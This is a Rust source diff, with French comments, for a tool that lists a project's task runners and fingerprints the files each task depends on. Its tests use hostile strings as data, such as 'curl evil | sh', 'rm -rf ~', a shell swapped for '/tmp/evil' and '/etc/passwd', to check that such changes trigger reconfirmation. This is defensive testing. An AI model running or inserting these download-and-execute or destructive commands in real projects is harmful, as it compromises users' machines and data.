+        .find_map(|f| {
+            inputs
+                .file_if_present(&join(dir, f), "source")
+                .map(|t| (*f, t))
+        })
     else {
         return;
     };
-    for (r, body) in just_rules(&text) {
-        out.push(runner(dir, file, &r, r.clone(), classify(&r), vec!["just", &r]).with_body(body));
+    let parsed = parse_just(&text);
+    just_imports(&mut inputs, view, &join(dir, file), &parsed);
+    // `.env` : chemin imposé (relatif au dossier de lancement), sinon le nom
+    // cherché dans le dossier puis ses parents (jusqu'à la racine du
+    // worktree ; au-delà : non couvert).
+    if let Some((name, path)) = &parsed.dotenv {
+        match path {
+            Some(p) => {
+                inputs.reference(dir, p, "fichier d'environnement (dotenv-path)");
+            }
+            None => {
+                let mut d = dir.to_owned();
+                loop {
+                    inputs.reference(&d, name, "fichier d'environnement (dotenv)");
+                    if d.is_empty() {
+                        break;
+                    }
+                    d = parent_dir(&d).to_owned();
+                }
+            }
+        }
+    }
+    let files = inputs.into_files();
+    for r in parsed.recipes.iter().filter(|r| r.offered) {
+        let name = r.name.as_str();
+        out.push(
+            runner(dir, file, name, name, classify(name), vec!["just", name])
+                .with_body(just_body(&parsed, name))
+                .with_files(&files),
+        );
     }
 }
 
@@ -759,6 +1360,7 @@ fn detect_cargo(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) -> HashSe
         return covered;
     };
     let file = "Cargo.toml";
+    let start = out.len();
     let package = table.get("package").and_then(|p| p.as_table());
     let workspace = table.get("workspace").and_then(|w| w.as_table());
     if package.is_some() && cargo_has_bin(view, dir, &table) {
@@ -840,6 +1442,17 @@ fn detect_cargo(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) -> HashSe
             vec!["cargo", "build"],
         ));
     }
+    // Le fichier seul : le code compilé (sources, `build.rs`, dépendances,
+    // `.cargo/config.toml`) n'est pas couvert par l'empreinte.
+    let mut inputs = Inputs::new(view);
+    inputs.file(
+        &join(dir, file),
+        "source (le code compilé n'est pas couvert)",
+    );
+    let files = inputs.into_files();
+    for r in &mut out[start..] {
+        r.files = files.clone();
+    }
     covered
 }
 
@@ -866,6 +1479,7 @@ fn detect_go(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
         return;
     }
     let file = "go.mod";
+    let start = out.len();
     if go_has_main(view, dir) {
         out.push(runner(
             dir,
@@ -892,12 +1506,23 @@ fn detect_go(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
         RunnerKind::Build,
         vec!["go", "build", "./..."],
     ));
+    // Le fichier seul : le code compilé n'est pas couvert par l'empreinte.
+    let mut inputs = Inputs::new(view);
+    inputs.file(
+        &join(dir, file),
+        "source (le code compilé n'est pas couvert)",
+    );
+    let files = inputs.into_files();
+    for r in &mut out[start..] {
+        r.files = files.clone();
+    }
 }
 
 // ------------------------------------------------------------------ compose
 
 fn detect_compose(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
-    // Ordre de préférence de `docker compose`.
+    // Ordre de préférence de `docker compose` ; un fichier trop gros ou
+    // illisible garde son runner (état visible dans `files`).
     let Some(file) = [
         "compose.yaml",
         "compose.yml",
@@ -905,11 +1530,28 @@ fn detect_compose(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
         "docker-compose.yml",
     ]
     .into_iter()
-    .find(|f| view.is_file(&join(dir, f))) else {
+    .find(|f| !matches!(view.load(&join(dir, f)), Loaded::Absent(_))) else {
         return;
     };
+    let path = join(dir, file);
+    let mut inputs = Inputs::new(view);
     // Le corps : le fichier compose lui-même (services, images, commandes).
-    let body = view.read(&join(dir, file)).unwrap_or_default();
+    let body = inputs.file(&path, "source");
+    match &body {
+        Some(text) => compose::compose_inputs(&mut inputs, &path, text),
+        None => inputs.marker(
+            &path,
+            FileState::Unresolved,
+            "forme non lue : fichier trop gros, illisible ou hors de la racine ; \
+             fichiers qu'il fait lire non suivis",
+        ),
+    }
+    // `.env` du projet (dossier du fichier compose) : lu par compose.
+    inputs.file(
+        &join(dir, ".env"),
+        "fichier d'environnement du projet (.env)",
+    );
+    let files = inputs.into_files();
     out.push(
         runner(
             dir,
@@ -919,15 +1561,17 @@ fn detect_compose(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
             RunnerKind::Dev,
             vec!["docker", "compose", "-f", file, "up"],
         )
-        .with_body(body),
+        .with_body(body.unwrap_or_default())
+        .with_files(&files),
     );
 }
 
 // ---------------------------------------------------------------- pyproject
 
 fn detect_pyproject(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
-    let Some(table) = view
-        .read(&join(dir, "pyproject.toml"))
+    let mut inputs = Inputs::new(view);
+    let Some(table) = inputs
+        .file_if_present(&join(dir, "pyproject.toml"), "source")
         .and_then(|t| t.parse::<toml::Table>().ok())
     else {
         return;
@@ -991,20 +1635,69 @@ fn detect_pyproject(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
             }
         }
     }
-    // Scripts de pdm (tâches) : toujours lancés par pdm.
+    // Scripts de pdm (tâches) : toujours lancés par pdm. Crochets
+    // (`pre_run`, `pre_script`, `pre_<nom>`, `post_…`) : pas proposés, montrés
+    // avec le script qu'ils encadrent.
     let pdm_lock = lock_of("pdm.lock");
-    for (k, b) in entries(
+    let pdm_scripts: BTreeMap<String, String> = entries(
         tool.and_then(|t| t.get("pdm"))
             .and_then(|p| p.get("scripts")),
-    ) {
-        if k != "_" {
-            names.entry(k).or_insert(("pdm", b, pdm_lock.clone()));
+    )
+    .into_iter()
+    .collect();
+    let pdm_hook = |k: &str| {
+        matches!(k, "pre_run" | "post_run" | "pre_script" | "post_script")
+            || ["pre_", "post_"].iter().any(|p| {
+                k.strip_prefix(p)
+                    .is_some_and(|base| !base.is_empty() && pdm_scripts.contains_key(base))
+            })
+    };
+    for (k, b) in &pdm_scripts {
+        if k != "_" && !pdm_hook(k) {
+            names
+                .entry(k.clone())
+                .or_insert(("pdm", b.clone(), pdm_lock.clone()));
         }
     }
+    for l in [lock_of("uv.lock"), lock_of("poetry.lock"), pdm_lock.clone()]
+        .into_iter()
+        .flatten()
+    {
+        inputs.file(&l, "fichier de verrou");
+    }
+    let files = inputs.into_files();
     for (name, (tool_name, body, lock)) in names {
         if !safe_name(&name) {
             continue;
         }
+        let body = if tool_name == "pdm" {
+            let hook = |k: String| pdm_scripts.get(&k).map(|b| format!("[{k}] {b}"));
+            let lines: Vec<String> = [
+                hook("pre_run".into()),
+                hook("pre_script".into()),
+                hook(format!("pre_{name}")),
+            ]
+            .into_iter()
+            .flatten()
+            .chain(std::iter::once(format!("[{name}] {body}")))
+            .chain(
+                [
+                    hook(format!("post_{name}")),
+                    hook("post_script".into()),
+                    hook("post_run".into()),
+                ]
+                .into_iter()
+                .flatten(),
+            )
+            .collect();
+            if lines.len() == 1 {
+                body
+            } else {
+                lines.join("\n")
+            }
+        } else {
+            body
+        };
         out.push(
             runner(
                 dir,
@@ -1015,7 +1708,8 @@ fn detect_pyproject(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
                 vec![tool_name, "run", &name],
             )
             .with_body(body)
-            .with_lock(lock),
+            .with_lock(lock)
+            .with_files(&files),
         );
     }
 }
@@ -1278,11 +1972,16 @@ mod tests {
     struct Mem {
         files: HashMap<String, String>,
         dirs: BTreeSet<String>,
+        /// Borne du hachage par blocs ([`MAX_STREAM_HASH_BYTES`] par défaut).
+        stream_max: u64,
     }
 
     impl Mem {
         fn with(files: &[(&str, &str)]) -> Self {
-            let mut m = Self::default();
+            let mut m = Self {
+                stream_max: MAX_STREAM_HASH_BYTES,
+                ..Self::default()
+            };
             for (p, c) in files {
                 m.files.insert((*p).to_owned(), (*c).to_owned());
                 let mut d = String::new();
@@ -1319,7 +2018,25 @@ mod tests {
 
     impl RepoView for Mem {
         fn read(&self, rel: &str) -> Option<String> {
-            self.files.get(rel).cloned()
+            self.files
+                .get(rel)
+                .filter(|t| t.len() as u64 <= MAX_SOURCE_BYTES)
+                .cloned()
+        }
+        fn load(&self, rel: &str) -> Loaded {
+            match self.files.get(rel) {
+                Some(t) if t.len() as u64 > MAX_HASH_BYTES => Loaded::TooLarge(t.len() as u64),
+                Some(t) => Loaded::Bytes(t.clone().into_bytes()),
+                None => Loaded::Absent(None),
+            }
+        }
+        fn hash_large(&self, rel: &str) -> Option<(u64, Option<String>)> {
+            let t = self.files.get(rel)?;
+            let n = t.len() as u64;
+            Some((
+                n,
+                (n <= self.stream_max).then(|| super::super::files::sha256_hex(t.as_bytes())),
+            ))
         }
         fn is_file(&self, rel: &str) -> bool {
             self.files.contains_key(rel)
@@ -1699,6 +2416,424 @@ paren x=(env("A", "b:c")):
         long.body = "é".repeat(MAX_BODY_SHOWN);
         let (shown, cut) = long.shown_body();
         assert!(cut && shown.len() <= MAX_BODY_SHOWN && shown.len() > MAX_BODY_SHOWN - 2);
+    }
+
+    /// Runner `id` détecté dans `files`.
+    fn det(files: &[(&str, &str)], id: &str) -> Runner {
+        find(&detect(&Mem::with(files)), id).clone()
+    }
+
+    /// `(chemin, état)` des fichiers pris en compte.
+    fn states(r: &Runner) -> Vec<(String, &'static str)> {
+        r.files
+            .iter()
+            .map(|f| (f.path.clone(), f.state.as_str()))
+            .collect()
+    }
+
+    fn st(list: &[(&str, &'static str)]) -> Vec<(String, &'static str)> {
+        list.iter().map(|(p, s)| ((*p).to_owned(), *s)).collect()
+    }
+
+    #[test]
+    fn npm_hooks_and_files() {
+        let pkg = |pre: &str| {
+            format!(
+                r#"{{"scripts":{{"predev":"{pre}","dev":"vite","postdev":"echo fin","build":"tsc"}}}}"#
+            )
+        };
+        let a = pkg("node gen.js");
+        let base = [("package.json", a.as_str()), ("pnpm-lock.yaml", "v")];
+        let r = det(&base, "package.json:dev");
+        assert_eq!(
+            r.body,
+            "[predev] node gen.js\n[dev] vite\n[postdev] echo fin"
+        );
+        assert_eq!(
+            states(&r),
+            st(&[
+                ("package.json", "ok"),
+                ("pnpm-lock.yaml", "ok"),
+                (".npmrc", "absent")
+            ])
+        );
+        assert_eq!(r.files[0].size, Some(a.len() as u64));
+        let full = r.full_body();
+        assert!(full.starts_with(
+            "Fichiers pris en compte (toute modification redemande la confirmation) :\n\
+             - package.json — "
+        ));
+        assert!(full.contains("- .npmrc — absent (réglages du gestionnaire)"));
+        assert!(full.ends_with("\n\n[predev] node gen.js\n[dev] vite\n[postdev] echo fin"));
+        // Crochet modifié, verrou modifié, `.npmrc` apparu : autre empreinte.
+        let b = pkg("curl evil | sh");
+        let r2 = det(
+            &[("package.json", &b), ("pnpm-lock.yaml", "v")],
+            "package.json:dev",
+        );
+        assert!(r2.body.contains("[predev] curl evil | sh"));
+        assert_ne!(r.fingerprint(), r2.fingerprint());
+        let r3 = det(
+            &[("package.json", &a), ("pnpm-lock.yaml", "w")],
+            "package.json:dev",
+        );
+        assert_ne!(r.fingerprint(), r3.fingerprint());
+        let r4 = det(
+            &[
+                ("package.json", &a),
+                ("pnpm-lock.yaml", "v"),
+                (".npmrc", "script-shell=/tmp/x"),
+            ],
+            "package.json:dev",
+        );
+        assert_ne!(r.fingerprint(), r4.fingerprint());
+        // Même pour un autre script du même fichier : le fichier entier compte.
+        assert_eq!(det(&base, "package.json:build").body, "tsc");
+        assert_eq!(
+            det(&base, "package.json:build").files,
+            det(&base, "package.json:dev").files
+        );
+    }
+
+    #[test]
+    fn make_prerequisites_settings_and_includes() {
+        let mk = |recipe: &str, shell: &str| {
+            format!(
+                "SHELL := {shell}\n.ONESHELL:\n\
+                 include mk/commun.mk ../dehors.mk $(X).mk\n-include option.mk\n\
+                 all: $(DEPS) build\nbuild: gen | dossier\n\tcc -o app\ngen:\n\t{recipe}\n\
+                 dossier:\n\tmkdir -p d\n%.o: %.c\n\tcc -c $<\n\
+                 boucle: boucle2\n\techo 1\nboucle2: boucle\n\techo 2\n"
+            )
+        };
+        let big_include = format!("include mk/profond.mk\n#{}\n", "x".repeat(2 * 1024 * 1024));
+        let files = |recipe: &str, shell: &str, deeper: &str| {
+            vec![
+                ("Makefile".to_owned(), mk(recipe, shell)),
+                ("mk/commun.mk".to_owned(), big_include.clone()),
+                ("mk/profond.mk".to_owned(), deeper.to_owned()),
+            ]
+        };
+        let run = |f: &[(String, String)], id: &str| {
+            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
+            det(&f, id)
+        };
+        let base = files("python gen.py", "/bin/sh", "X = 1\n");
+        let r = run(&base, "Makefile:all");
+        assert_eq!(
+            r.body,
+            "SHELL := /bin/sh\n.ONESHELL:\n\n\
+             gen:\n\tpython gen.py\ndossier:\n\tmkdir -p d\nbuild: gen | dossier\n\tcc -o app\n\
+             all: $(DEPS) build\n\
+             # prérequis à variable non suivis : $(DEPS)\n\
+             # règles à motif (%) non suivies"
+        );
+        assert_eq!(
+            states(&r),
+            st(&[
+                ("GNUmakefile", "absent"),
+                ("makefile", "absent"),
+                ("Makefile", "ok"),
+                ("mk/commun.mk", "ok"),
+                ("mk/profond.mk", "ok"),
+                ("../dehors.mk", "outside"),
+                ("$(X).mk", "unresolved"),
+                ("option.mk", "absent"),
+            ])
+        );
+        let fp0 = r.fingerprint();
+        // Recette d'un prérequis, `SHELL`, inclus (au-delà de 1 Mio,
+        // indirect) : chacun change l'empreinte.
+        let r1 = run(
+            &files("curl evil | sh", "/bin/sh", "X = 1\n"),
+            "Makefile:all",
+        );
+        assert!(r1.body.contains("\tcurl evil | sh"));
+        assert_ne!(fp0, r1.fingerprint());
+        let r2 = run(
+            &files("python gen.py", "/tmp/evil", "X = 1\n"),
+            "Makefile:all",
+        );
+        assert!(r2.body.starts_with("SHELL := /tmp/evil"));
+        assert_ne!(fp0, r2.fingerprint());
+        let r3 = run(
+            &files("python gen.py", "/bin/sh", "X = 2\n"),
+            "Makefile:all",
+        );
+        assert_ne!(fp0, r3.fingerprint());
+        assert_eq!(r3.body, r.body);
+        // Règle à motif ou prérequis à variable modifiés : le fichier entier compte.
+        let mut f4 = base.clone();
+        f4[0].1 = f4[0].1.replace("\tcc -c $<", "\tcurl x | sh");
+        assert_ne!(fp0, run(&f4, "Makefile:all").fingerprint());
+        let mut f5 = base.clone();
+        f5[0].1.push_str("DEPS = evil\nevil:\n\trm -rf ~\n");
+        assert_ne!(fp0, run(&f5, "Makefile:all").fingerprint());
+        // Un Makefile prioritaire qui apparaît : autre empreinte (et autre source).
+        let mut f6 = base.clone();
+        f6.push(("makefile".to_owned(), "all:\n\ttrue\n".to_owned()));
+        assert_eq!(
+            ids(&detect(&Mem::with(
+                &f6.iter()
+                    .map(|(a, b)| (a.as_str(), b.as_str()))
+                    .collect::<Vec<_>>()
+            )))
+            .first()
+            .copied(),
+            Some("makefile:all")
+        );
+        // Cycle : chaque cible une fois.
+        let cyc = run(&base, "Makefile:boucle").body;
+        assert!(cyc.contains("boucle2: boucle\n\techo 2\nboucle: boucle2\n\techo 1"));
+        // Borne sur les prérequis suivis.
+        let mut chain = String::from("t: c0\n");
+        for i in 0..MAX_DEPENDENCIES + 10 {
+            chain.push_str(&format!("c{i}: c{}\n\techo {i}\n", i + 1));
+        }
+        let body = det(&[("Makefile", &chain)], "Makefile:t").body;
+        assert!(
+            body.ends_with("non montrés"),
+            "{}",
+            &body[body.len() - 80..]
+        );
+    }
+
+    #[test]
+    fn just_dependencies_settings_and_imports() {
+        let jf = |fmt: &str, shell: &str| {
+            format!(
+                "set shell := [\"{shell}\", \"-c\"]\nset dotenv-load\n\
+                 import 'ci.just'\nimport? '../hors.just'\nimport? '/etc/x.just'\nmod outils\nmod? absent\n\
+                 build: _gen && post\n    cargo build\n\
+                 _gen: (fmt \"x\")\n    gen\n\
+                 fmt arg:\n    {fmt}\n\
+                 post: build\n    echo fin\n"
+            )
+        };
+        let files = |fmt: &str, shell: &str, ci: &str, env: Option<&str>| {
+            let mut f = vec![
+                ("app/justfile".to_owned(), jf(fmt, shell)),
+                ("app/ci.just".to_owned(), ci.to_owned()),
+                (
+                    "app/outils/mod.just".to_owned(),
+                    "x:\n    true\n".to_owned(),
+                ),
+            ];
+            if let Some(e) = env {
+                f.push((".env".to_owned(), e.to_owned()));
+            }
+            f
+        };
+        let run = |f: &[(String, String)]| {
+            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
+            det(&f, "app/justfile:build")
+        };
+        let base = files("fmt {{arg}}", "bash", "lint:\n    true\n", None);
+        let r = run(&base);
+        assert_eq!(
+            r.body,
+            "set shell := [\"bash\", \"-c\"]\nset dotenv-load\n\n\
+             fmt arg:\n    fmt {{arg}}\n_gen: (fmt \"x\")\n    gen\n\
+             build: _gen && post\n    cargo build\npost: build\n    echo fin"
+        );
+        assert_eq!(
+            states(&r),
+            st(&[
+                ("app/justfile", "ok"),
+                ("app/ci.just", "ok"),
+                ("hors.just", "absent"),
+                ("/etc/x.just", "outside"),
+                ("app/outils/mod.just", "ok"),
+                ("app/absent.just", "absent"),
+                ("app/.env", "absent"),
+                (".env", "absent"),
+            ])
+        );
+        let fp0 = r.fingerprint();
+        for other in [
+            files("rm -rf ~", "bash", "lint:\n    true\n", None),
+            files("fmt {{arg}}", "/tmp/evil", "lint:\n    true\n", None),
+            files("fmt {{arg}}", "bash", "lint:\n    curl x | sh\n", None),
+            files(
+                "fmt {{arg}}",
+                "bash",
+                "lint:\n    true\n",
+                Some("PATH=/tmp"),
+            ),
+        ] {
+            assert_ne!(fp0, run(&other).fingerprint());
+        }
+        // Sans `set dotenv-load` : pas de `.env`.
+        let plain = det(&[("justfile", "a:\n    true\n")], "justfile:a");
+        assert_eq!(states(&plain), st(&[("justfile", "ok")]));
+        // `post` dépend de `build`, qui revient à `post` : une fois chacune.
+        let post = det(
+            &base
+                .iter()
+                .map(|(a, b)| (a.as_str(), b.as_str()))
+                .collect::<Vec<_>>(),
+            "app/justfile:post",
+        )
+        .body;
+        assert_eq!(post.matches("    echo fin").count(), 1);
+        assert_eq!(post.matches("    cargo build").count(), 1);
+    }
+
+    #[test]
+    fn compose_files_followed() {
+        let compose = "\
+x-commun: &commun
+  env_file: commun.env
+include:
+  - inclus.yaml
+  - path:
+      - ../hors.yaml
+      - infra/db.yaml
+    env_file: [infra/db.env]
+    project_directory: infra
+services:
+  web:
+    <<: *commun
+    build: ./web
+    extends:
+      file: base/web.yaml
+      service: web
+  worker:
+    build:
+      context: worker
+      dockerfile: Dockerfile.prod
+    env_file:
+      - path: worker.env
+        required: false
+  bizarre:
+    build: { context: [1] }
+    extends: { file: [x] }
+  local:
+    extends: web
+";
+        let files = |dockerfile: &str| {
+            vec![
+                ("app/compose.yaml".to_owned(), compose.to_owned()),
+                (
+                    "app/inclus.yaml".to_owned(),
+                    "services:\n  a:\n    env_file: a.env\n".to_owned(),
+                ),
+                ("app/infra/db.yaml".to_owned(), "services: {}\n".to_owned()),
+                ("app/base/web.yaml".to_owned(), "services: {}\n".to_owned()),
+                ("app/web/Dockerfile".to_owned(), dockerfile.to_owned()),
+                (
+                    "app/worker/Dockerfile.prod".to_owned(),
+                    "FROM x\n".to_owned(),
+                ),
+                ("hors.yaml".to_owned(), "x".to_owned()),
+            ]
+        };
+        let run = |f: &[(String, String)]| {
+            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
+            det(&f, "app/compose.yaml:up")
+        };
+        let r = run(&files("FROM nginx\n"));
+        assert_eq!(r.body, compose);
+        let got = states(&r);
+        for want in [
+            ("app/compose.yaml", "ok"),
+            ("app/inclus.yaml", "ok"),
+            ("app/a.env", "absent"),
+            ("hors.yaml", "ok"),
+            ("app/infra/db.yaml", "ok"),
+            ("app/infra/db.env", "absent"),
+            ("app/infra/.env", "absent"),
+            ("app/commun.env", "absent"),
+            ("app/web/Dockerfile", "ok"),
+            ("app/base/web.yaml", "ok"),
+            ("app/worker/Dockerfile.prod", "ok"),
+            ("app/worker.env", "absent"),
+            ("app/.env", "absent"),
+        ] {
+            assert!(
+                got.contains(&(want.0.to_owned(), want.1)),
+                "{want:?} absent de {got:?}"
+            );
+        }
+        // Formes non lues : signalées sur le fichier compose.
+        let unread: Vec<&str> = r
+            .files
+            .iter()
+            .filter(|f| f.state == FileState::Unresolved)
+            .map(|f| f.note.as_str())
+            .collect();
+        assert_eq!(
+            unread,
+            [
+                "forme non lue : extends.file = […]",
+                "forme non lue : build = {…}"
+            ]
+        );
+        // Dockerfile modifié : autre empreinte.
+        assert_ne!(
+            r.fingerprint(),
+            run(&files("FROM nginx\nRUN curl x | sh\n")).fingerprint()
+        );
+        // YAML illisible : runner gardé, signalé.
+        let bad = det(&[("compose.yaml", "services: [\n")], "compose.yaml:up");
+        assert!(bad.files.iter().any(|f| f.state == FileState::Unresolved
+            && f.note.starts_with("forme non lue : YAML illisible")));
+        // Trop gros : runner gardé, état visible, corps vide mais fichiers dits.
+        let huge = "#".repeat(MAX_HASH_BYTES as usize + 1);
+        let big = det(&[("compose.yaml", &huge)], "compose.yaml:up");
+        assert_eq!(big.files[0].state, FileState::TooLarge);
+        assert_eq!(big.files[0].size, Some(MAX_HASH_BYTES + 1));
+        assert!(
+            big.full_body()
+                .contains("compose.yaml — trop gros pour être montré")
+        );
+        // Haché quand même, en entier : modifié à taille égale → autre empreinte.
+        let mut huge2 = huge.clone();
+        huge2.replace_range(1000..1001, "x");
+        let big2 = det(&[("compose.yaml", &huge2)], "compose.yaml:up");
+        assert_eq!(big2.files[0].size, big.files[0].size);
+        assert_ne!(big.fingerprint(), big2.fingerprint());
+        assert!(big.files[0].note.contains("haché en entier"));
+        // Au-delà de la borne du hachage par blocs : seule la taille compte.
+        let mut m = Mem::with(&[("compose.yaml", &huge)]);
+        m.stream_max = MAX_HASH_BYTES;
+        let only_size = find(&detect(&m), "compose.yaml:up").clone();
+        m.files.insert("compose.yaml".into(), huge2.clone());
+        let only_size2 = find(&detect(&m), "compose.yaml:up").clone();
+        assert_eq!(only_size.fingerprint(), only_size2.fingerprint());
+        assert!(only_size.files[0].note.contains("seule la taille compte"));
+    }
+
+    #[test]
+    fn referenced_paths_are_resolved_under_the_root() {
+        assert_eq!(resolve_ref("app", "mk/a.mk"), Ok("app/mk/a.mk".into()));
+        assert_eq!(resolve_ref("app", "./../b.mk"), Ok("b.mk".into()));
+        assert_eq!(resolve_dir("app", ".."), Ok(String::new()));
+        assert_eq!(resolve_dir("", "."), Ok(String::new()));
+        for (w, state) in [
+            ("../../x", FileState::Outside),
+            ("/etc/passwd", FileState::Outside),
+            ("~/x", FileState::Outside),
+            ("..", FileState::Outside),
+            ("$(HOME)/x", FileState::Unresolved),
+            ("*.mk", FileState::Unresolved),
+            ("${X}.yaml", FileState::Unresolved),
+            ("oci://registry/x", FileState::Unresolved),
+        ] {
+            assert_eq!(resolve_ref("app", w).map_err(|e| e.0), Err(state), "{w}");
+        }
+        // Empreinte : commande, dossier, source et fichiers triés seulement.
+        let r = det(&[("go.mod", "module x\n")], "go.mod:test");
+        let files = vec![("go.mod", "ok", r.files[0].digest.as_str())];
+        let v = serde_json::json!([r.command, r.cwd, r.source, files]);
+        assert_eq!(
+            r.fingerprint(),
+            super::super::files::sha256_hex(v.to_string().as_bytes())
+        );
+        assert_eq!(
+            r.files[0].digest,
+            super::super::files::sha256_hex(b"module x\n")
+        );
     }
 
     #[test]
